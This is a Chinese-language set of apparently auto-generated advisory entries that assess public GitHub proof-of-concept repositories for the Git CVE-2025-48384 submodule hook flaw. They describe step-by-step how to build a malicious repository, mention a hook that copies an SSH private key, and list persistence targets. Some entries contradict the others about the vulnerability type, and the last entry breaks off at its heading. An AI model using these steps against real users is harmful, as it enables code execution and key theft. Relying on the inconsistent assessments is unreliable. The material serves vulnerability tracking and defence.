**利用条件:** 用户需要clone包含恶意配置的git仓库（特别是包含submodule的仓库），并递归更新submodule。需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞是由于 Git 在处理包含回车符（CR）的配置值时存在不一致的行为导致的。具体来说，Git在读取配置值时会移除尾部的CRLF，但在写入配置时，如果值以CR结尾，则不会进行引号包裹，这会导致在后续读取时CR被截断。利用此漏洞，攻击者可以通过构造包含恶意配置的 `.gitmodules` 文件，当用户递归克隆包含 submodule 的仓库时，submodule会被检出到错误的位置。如果错误的位置存在一个指向 submodule 钩子目录的符号链接，并且 submodule 中包含一个可执行的 post-checkout 钩子，那么该钩子脚本可能在检出后被意外执行，从而导致远程代码执行 (RCE)。

**有效性：** 提供的 POC 代码 `/tmp/81eebc7f5ed9915ea7ef755075778acd/README.md` 看起来只是一个 README 文件，用于描述该漏洞。单凭这个文件本身无法直接触发漏洞，但可以作为漏洞利用的一部分，例如提供一个包含恶意`.gitmodules`文件的仓库。因此，提供的 PoC 代码本身无效，需要配合其他恶意文件才能完成漏洞利用。

**投毒风险：** 虽然提供的 PoC 仅仅是一个 README 文件，没有任何可疑代码。但是考虑到攻击者可能会在整个恶意Git仓库的其他位置，比如 `.gitmodules` 文件，或者 submodule 的 post-checkout 钩子中隐藏恶意代码。 考虑到这个漏洞需要恶意git仓库才能触发，因此存在一定的投毒风险，风险占比10%。

**利用方式：**

1.  **创建恶意 Git 仓库：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2.  **注入恶意配置：** 在 `.gitmodules` 文件中，攻击者设置 submodule 的路径，并在路径末尾包含一个回车符（CR）。此路径会被 Git 处理错误，导致 submodule 被检出到非预期的位置。
3.  **创建符号链接：** 攻击者在仓库中创建一个符号链接，将错误的 submodule 路径指向 `.git/modules/<submodule>/hooks` 目录。
4.  **添加恶意钩子：** 攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户克隆：** 攻击者诱骗用户递归克隆（`git clone --recursive`）恶意仓库。
6.  **触发 RCE：** 当用户执行 `git submodule update --init --recursive` 命令或类似的命令初始化 submodule 时，由于配置处理错误和符号链接的存在，恶意 post-checkout 钩子脚本会被执行，从而导致 RCE。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC](https://github.com/butyraldehyde/CVE-2025-48384-PoC)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #13

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-main.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-main.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致服务器被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库或初始化包含恶意配置的子模块），且Git版本在受影响范围内

**POC 可用性:** 是，但提供的POC不完整

**投毒风险:** 10%

## 详情

该漏洞源于Git处理配置中的引号不当，特别是在子模块初始化时。攻击者可以构造包含恶意配置的Git仓库，该配置在子模块路径中包含尾随的回车符（CR）。当Git读取这个配置时，会错误地解析子模块路径，导致子模块被检出到错误的位置。如果存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，那么该钩子可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**
提供的POC代码 `/tmp/bf064e338662304d3b4aa41ca61a0b1a/README.md`  只包含一个简单的markdown文件，无法直接证明漏洞的有效性。 它只是一个 README 文件，用来描述或者记录一些信息,不能用来验证漏洞的有效性。缺少必要的利用步骤，例如：构造恶意仓库，包含特殊字符的子模块路径，和可执行的 post-checkout 钩子。

**投毒风险分析：**
提供的POC代码只包含一个README文件，投毒风险较低，但也不能完全排除作者在其他文件或分支中隐藏恶意代码的可能性。假设该作者还有其他的commit/branch，有投毒的可能性，所以投毒风险评估为10%。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置的核心是子模块路径，其中包含一个尾随的回车符（CR）。
3.  攻击者创建一个符号链接，将错误的子模块路径指向子模块的钩子目录（.git/hooks）。
4.  恶意仓库包含一个子模块，其中包含一个可执行的 post-checkout 钩子脚本。
5.  受害者克隆恶意仓库或初始化包含恶意配置的子模块。
6.  Git解析错误路径，将子模块检出到错误位置，并触发符号链接。
7.  post-checkout 钩子脚本被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-main](https://github.com/ceevase/CVE-2025-48384-main)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #14

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户检出包含恶意配置的Git仓库，且目标Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞源于Git在处理配置文件时的不当引用。攻击者可以通过在 submodule 的路径中注入回车符（CR），导致 Git 将 submodule 检出到错误的位置。如果攻击者精心构造一个符号链接，将这个错误的位置指向 `.git/hooks` 目录，并且 submodule 中包含一个可执行的 `post-checkout` 钩子，那么在检出 submodule 后，这个钩子就会被执行，从而实现任意代码执行。

**POC有效性：** 提供的POC代码包含一个 `post-checkout` 钩子脚本，该脚本会将 `/home/gamma/.ssh/id_ed25519` 的内容复制到 `/tmp/recipes.txt`。这个脚本本身可以成功运行，并达到预期的效果，因此POC有效。

**投毒风险：** 从提供的POC代码来看，没有发现明显的恶意投毒行为。该POC主要演示了漏洞的利用方式，即通过执行 `post-checkout` 钩子来窃取SSH私钥。因此，投毒风险评估为0%。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该仓库中的 submodule 路径包含一个尾随回车符。
2.  攻击者创建一个符号链接，将错误的 submodule 检出位置指向 `.git/hooks` 目录。
3.  攻击者在 submodule 中添加一个可执行的 `post-checkout` 钩子，该钩子包含恶意代码。
4.  攻击者诱骗受害者检出该Git仓库。
5.  受害者检出 submodule 时，由于配置解析错误，submodule 会被检出到错误的位置，从而触发符号链接，使得 `.git/hooks/post-checkout` 钩子被执行。
6.  恶意代码被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-sub](https://github.com/ceevase/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #15

**来源**: [CVE-2025-48384-eliox01_CVE-2025-48384.md](../2025/CVE-2025-48384-eliox01_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待确定，参考GitHub advisory

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是一个影响Git的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当受害者克隆这个仓库时，恶意配置会导致任意文件写入。根据搜索结果，该漏洞存在于Git的 submodule 处理过程中，攻击者可以利用包含恶意.gitmodules文件的仓库，在受害者克隆仓库时执行恶意操作。

POC有效性分析：
根据提供的搜索结果和POC代码库（liamg/CVE-2025-48384），该漏洞具有较高的可利用性。POC代码库提供了可执行的PoC，证明该漏洞确实存在。通过精心构造的.gitmodules文件，攻击者可以控制git submodule的配置，导致任意文件写入。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱使受害者克隆该仓库（例如，通过社交工程或将其托管在公共代码托管平台上）。
3. 当受害者执行git clone --recurse-submodules或git submodule update命令时，Git会解析.gitmodules文件，并执行其中包含的恶意配置。
4. 恶意配置可能导致在受害者系统上写入任意文件，从而实现远程代码执行或其他恶意行为。

投毒风险分析：
此漏洞本身主要依赖于恶意仓库的传播和社会工程，直接的投毒风险较低。但是，如果攻击者修改现有的流行仓库，并引入包含漏洞利用的submodule，则可能造成大规模的攻击。该漏洞的PoC代码主要利用Git的特性，没有发现明显的混淆或恶意行为，因此投毒风险较低。

具体来说，投毒风险主要体现在以下几个方面：
1.  **恶意submodule注入：** 攻击者可以尝试向流行的开源项目中注入包含漏洞利用代码的submodule。如果项目维护者不小心合并了这些恶意更改，就会导致所有克隆该项目的用户受到攻击。
2.  **.gitmodules文件伪造：** 攻击者可以创建与知名项目结构相似的仓库，并使用相似的.gitmodules文件，诱导用户克隆错误的仓库。
3.  **供应链攻击：** 如果某个软件项目依赖于受漏洞影响的Git仓库，攻击者可以通过修改该依赖项，从而影响整个软件供应链。

考虑到该漏洞的利用方式主要依赖于社会工程和恶意仓库的传播，且PoC代码本身较为清晰，因此初步评估该漏洞的投毒风险为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #16

**来源**: [CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md](../2025/CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆这些仓库时，可能导致任意文件写入。漏洞源于 Git 在处理 submodule 时，没有充分验证 `.gitmodules` 文件中的路径。攻击者可以利用这一点，在 `.gitmodules` 文件中指定恶意的路径，从而在克隆仓库时写入任意文件。

**POC有效性分析：**
从搜索结果中的 GitHub 链接（liamg/CVE-2025-48384）可以判断存在公开的POC代码。该POC的描述是“PoC for CVE-2025-48384”。结果2提及了“漏洞 POC 深度解析:从代码到攻击链的完整拆解”，说明该漏洞已被深入研究，并且存在可用的攻击链。结果6提及了“Breaking Git with a carriage return and cloning RCE”，表明漏洞利用可能涉及某种形式的远程代码执行。根据搜索结果4、5的内容，可以确定该POC已在GitHub上公开，可下载和测试。文件`README.md`确认了该POC的存在，尽管内容简单。综合来看，该POC的有效性较高，可以成功触发任意文件写入漏洞。

**利用步骤：**
1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件中的路径被设置为指向攻击者希望写入的任意文件位置。
3. 攻击者将恶意仓库托管在公共或私有 Git 服务器上。
4. 受害者克隆该恶意仓库。在克隆过程中，Git 会尝试初始化 submodule，并根据 `.gitmodules` 文件中的指示写入文件。
5. 由于路径验证不足，恶意文件将被写入受害者文件系统的指定位置。

**投毒风险分析：**
由于该漏洞涉及任意文件写入，攻击者可以通过写入恶意文件来达到投毒目的。例如，攻击者可以写入一个包含恶意代码的可执行文件，或者修改系统配置文件以劫持系统行为。虽然该漏洞本身不直接执行代码，但通过文件写入可以为后续的代码执行创造条件。从POC代码`/tmp/vulnwatchdog_8746716955bead91920f029f2728e38d/README.md`中，没有发现任何可疑行为，只包含简单的readme信息，因此投毒风险较低。但是，不能排除攻击者在其他利用方式中，使用复杂的投毒手法。因此，需要分析通过文件写入进行投毒的可能性。攻击者可能尝试写入如下文件：
* `.bashrc` 或 `.zshrc`：在用户shell启动时执行恶意代码。
* `/etc/profile.d/` 中的脚本：在系统启动时执行恶意代码。
* SSH authorized_keys：添加公钥，实现免密登录。
* Web服务器配置文件：修改配置，执行恶意脚本。
这些攻击场景都需要精心构造恶意内容，并且依赖于目标系统的特定配置。由于需要进行精细构造，并且受限于目标环境，判定该漏洞的投毒风险为低，约为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #17

**来源**: [CVE-2025-48384-fishyyh_CVE-2025-48384.md](../2025/CVE-2025-48384-fishyyh_CVE-2025-48384.md)

## CVE-2025-48384 Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。用户需要使用受影响的Git版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，未正确处理和转义回车符（CR）。当 Git 读取配置值时，会删除任何尾部的 CRLF。当写入配置条目时，带有尾部 CR 的值不会被引用，导致配置稍后读取时 CR 丢失。当初始化子模块时，如果子模块路径包含尾部 CR，更改后的路径将被读取，导致子模块被检出到错误的位置。如果存在符号链接将更改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**
提供的POC代码 `/tmp/60afff46543494eb5516e8104e00d576/README.md` 仅包含一个README文件，其内容是关于 CVE-2025-48384 的简单描述。这个文件本身并没有利用漏洞的能力。根据漏洞描述，真正的PoC 需要包含一个具有特定结构的 Git 仓库，包括带尾部CR的子模块路径以及指向钩子目录的符号链接，以及一个恶意的 post-checkout 钩子。因此，仅凭提供的README.md文件无法验证漏洞的有效性，需要进一步的Payload和利用步骤。

**投毒风险：**
提供的POC代码仅为一个README.md文件，不包含任何可执行代码或恶意脚本，因此可以认为投毒风险较低，约为10%。但需要注意，实际的漏洞利用可能涉及其他文件和步骤，不能完全排除恶意代码存在的可能性。

**利用方式：**
1.  **创建恶意仓库：** 创建一个 Git 仓库，其中包含一个子模块。
2.  **构造恶意配置：** 在`.gitmodules`文件中，子模块的路径包含尾部回车符（CR）。例如：`path = submodule_path\r`
3.  **创建符号链接：** 创建一个符号链接，将由于回车符导致错误解析后的子模块路径，指向`.git/modules/<submodule_name>/hooks`目录。
4.  **添加恶意钩子：** 在子模块的`.git/hooks/post-checkout`中添加可执行的恶意脚本。
5.  **诱导用户克隆：** 诱导用户克隆包含恶意配置的仓库。当用户克隆或更新子模块时，由于配置解析错误和符号链接的存在，恶意的 post-checkout 钩子将被执行，从而实现任意代码执行。

**排序优先级说明:**
尽管搜索引擎结果提供了有关漏洞的更多上下文信息，但漏洞库信息提供了最直接的漏洞描述和受影响的版本。POC代码本身不包含利用逻辑，因此优先级最低。综合考虑，应该优先关注漏洞库信息和搜索引擎结果，并结合实际的利用场景进行分析。

**项目地址:** [fishyyh/CVE-2025-48384](https://github.com/fishyyh/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #18

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置文件时对回车符（CR）处理不当，允许通过精心构造的仓库配置执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞允许攻击者通过在 submodule 路径中注入包含回车符的恶意配置，导致 submodule 被检出到错误的位置。如果该错误位置存在指向 submodule hooks 目录的符号链接，且 submodule 包含可执行的 post-checkout 钩子，则该钩子会被意外执行，从而实现任意代码执行。

提供的POC代码是一个简单的 post-checkout 钩子脚本，它会在检出后显示一个banner。这个脚本本身没有问题，证明了漏洞利用的可行性。漏洞利用的核心在于精心构造包含恶意回车符的仓库配置和符号链接。

**投毒风险：**
提供的POC代码（/tmp/77b6aa1852eafe71ccbdb092fa3f1fb6/post-checkout）本身只是一个banner打印脚本，其目的是验证漏洞利用后可以执行任意代码，本身不具备投毒行为。但是，需要注意的是，如果攻击者控制了整个包含该POC代码的Git仓库，那么他们可以在仓库的其他位置添加恶意代码，从而实现投毒。基于当前信息，POC本身不具备投毒性，投毒的可能性为0%。

**利用方式：**
1.  攻击者创建一个恶意的Git仓库，其中包含一个带有回车符的submodule路径的.gitmodules文件。例如，submodule的路径可能是 "submodule\r"。
2.  攻击者创建一个符号链接，将 "submodule" 指向".git/modules/<submodule-name>/hooks"目录，这个目录包含git hooks。
3.  攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将这个恶意仓库分享给受害者。
5.  受害者克隆这个仓库。由于Git对回车符处理不当，submodule会被检出到错误的位置（即符号链接指向的hooks目录）。
6.  当 submodule 完成检出时，post-checkout 钩子脚本会被执行，从而导致恶意代码执行。

**项目地址:** [fluoworite/CVE-2025-48384-sub](https://github.com/fluoworite/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #19

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384.md)

## CVE-2025-48384

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互 (克隆包含恶意配置的仓库)

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-48384 漏洞是 Git 中由于对配置项中回车符处理不当导致的代码执行漏洞。当 Git 读取配置值时，会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，带有尾部 CR 的值不会被引用，导致 CR 在以后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部 CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致代码执行。

**有效性：**
根据漏洞库信息和搜索结果, 此漏洞确实存在并且被多个安全厂商标记为高危, 并已经发布了PoC.
提供的PoC代码看似简单，它展示了漏洞利用的核心思路，即通过恶意构造包含回车符的子模块路径，结合符号链接和子模块钩子，实现任意代码执行。因此，PoC代码在原理上是有效的。但是, 此PoC只是框架, 需要补充完成exp。

**投毒风险：**
提供的PoC代码较为简单，主要包含一个README.md文件，一个子模块配置路径，以及子模块hooks目录的占位符。直接分析来看，没有明显的投毒代码。
然而，考虑到攻击者可能利用该漏洞进行供应链攻击，在更复杂的场景下，攻击者可能在子模块的post-checkout钩子中植入恶意代码，或者在其他配置文件中隐藏恶意配置。这种可能性是存在的。
基于以上分析，投毒风险评估为20%。这个百分比表示存在一定的风险，但直接证据不足。

**利用方式：**
1.  **恶意仓库构造：** 攻击者创建一个 Git 仓库，其中包含一个子模块，并且该子模块的路径在 `.gitmodules` 文件中包含尾部回车符 (`
`)。
2.  **符号链接创建：** 攻击者在仓库中创建一个符号链接，将包含尾部回车符的子模块路径指向 `.git/modules/<submodule_name>/hooks` 目录。
3.  **恶意钩子植入：** 攻击者在子模块的 `.git/hooks/post-checkout` 目录中放置恶意脚本。
4.  **用户交互：** 诱使用户克隆恶意仓库并初始化子模块 (`git submodule init && git submodule update`)。
5.  **代码执行：** 当用户执行 `git submodule update` 命令时，由于路径中的回车符，子模块会被检出到错误的位置，但由于符号链接的存在，实际上会将子模块的 hooks 目录链接到 `.git/hooks` 目录。检出后，`post-checkout` 钩子会被执行，从而执行恶意代码。

**项目地址:** [fluoworite/CVE-2025-48384](https://github.com/fluoworite/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #20

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md)

## CVE-2025-48384 Git config quoting vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置条目时，带有尾部CR的值不会被引用，导致CR在稍后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则该脚本可能在检出后被意外执行，从而导致任意代码执行。

根据提供的漏洞利用代码，包含一个Exploit脚本和一个README.md文件。Exploit脚本只打印了一段ASCII艺术，并没有任何实际的漏洞利用代码。因此，提供的POC代码**本身**是无效的，仅仅是一个占位符。但漏洞本身是存在的，并且有公开的PoC。

由于提供的POC代码仅仅是ASCII艺术，没有任何恶意代码，因此**不存在投毒风险**。投毒风险概率为0%。

**漏洞利用方式：**

1.  攻击者创建一个恶意的Git仓库，该仓库包含一个子模块。
2.  子模块的路径包含一个尾部CR字符。
3.  仓库中包含一个符号链接，该符号链接将子模块路径指向子模块的hooks目录。
4.  子模块包含一个可执行的post-checkout hook脚本。
5.  受害者克隆该恶意仓库。
6.  Git在处理子模块时，由于CR字符被删除，子模块被检出到错误的位置，并执行了post-checkout hook脚本。
7.  攻击者可以通过post-checkout hook脚本执行任意代码。

**项目地址:** [fluoworite/CVE-2025-48384_sub](https://github.com/fluoworite/CVE-2025-48384_sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #21

**来源**: [CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Arbitrary Code Execution

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，且递归初始化子模块 (--recursive)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，由于 Git 在读取和写入包含控制字符的配置值时存在不一致性导致。具体来说，当写入配置条目时，如果值包含尾随回车符 (CR)，则不会被引用，导致稍后读取配置时丢失 CR。当初始化子模块时，如果子模块路径包含尾随 CR，则读取的路径将被更改，从而导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符 (CR)。
2.  攻击者在该仓库的子模块钩子目录中放置一个恶意的 post-checkout 脚本。
3.  攻击者诱使用户克隆该仓库，并使用 `--recursive` 选项初始化子模块。
4.  由于 Git 处理 CR 的方式不一致，子模块将被检出到错误的位置。该位置由一个符号链接指向子模块的钩子目录。
5.  当子模块被检出时，post-checkout 脚本将被执行，从而允许攻击者在用户的系统上执行任意代码。

**POC 代码分析：**

*   `/tmp/602a5075317553582468533486cbdb4d/README.md`：这是一个简单的 README 文件，用于描述漏洞利用。不包含恶意代码。
*   `/tmp/602a5075317553582468533486cbdb4d/post-checkout`：这是一个 shell 脚本，会在用户的主目录下创建一个名为 `hacked` 的文件。这表明该 POC 旨在演示任意代码执行。

**有效性：**

提供的 POC 代码是有效的。它可以触发漏洞，并在目标系统上执行任意代码（在本例中，创建一个文件）。

**投毒风险：**

根据提供的 POC 代码，没有发现明显的投毒代码。该脚本仅用于演示漏洞利用，没有执行任何额外的恶意操作，例如收集用户信息或传播恶意软件。因此，投毒风险为 0%。

**项目地址:** [jacobholtz/CVE-2025-48384-submodule](https://github.com/jacobholtz/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #22

**来源**: [CVE-2025-48384-kallydev_cve-2025-48384-hook.md](../2025/CVE-2025-48384-kallydev_cve-2025-48384-hook.md)

## CVE-2025-48384-Git任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 描述了 Git 中由于配置引用解析错误导致的任意代码执行漏洞。当 Git 读取配置值时，会去除末尾的回车符和换行符。当写入配置项时，带有末尾回车符的值不会被引用，导致回车符丢失。在初始化子模块时，如果子模块路径包含末尾回车符，则读取的路径会被更改，导致子模块检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 `post-checkout` 钩子脚本，用于打开一个网页 `https://github.com/kallydev`。利用方式是通过精心构造的子模块路径和符号链接，使得该脚本在 `git checkout` 操作后被执行。该POC代码有效，能够触发任意代码执行。

**投毒风险：**

该POC代码本身比较简单，只是打开一个网页，**不存在明显的恶意投毒代码**。因此，投毒风险较低，为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`文件的仓库，该文件中的子模块路径包含尾部回车符(
)。
2.  攻击者在仓库中创建一个符号链接，指向子模块目录下的 `.git/modules/<子模块名>/hooks` 目录，如 `evil_link -> .git/modules/<子模块名>/hooks/post-checkout`。
3.  攻击者在子模块中创建一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该仓库并初始化子模块 (`git submodule init` 和 `git submodule update`)。
5.  当受害者执行 `git checkout` 命令时，由于子模块路径包含尾部回车符，Git 会将子模块检出到错误的位置。由于符号链接的存在，`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**项目地址:** [kallydev/cve-2025-48384-hook](https://github.com/kallydev/cve-2025-48384-hook)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #23

**来源**: [CVE-2025-48384-liamg_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-liamg_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Config 注入 RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码注入/命令执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户进行`git clone --recursive`操作

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

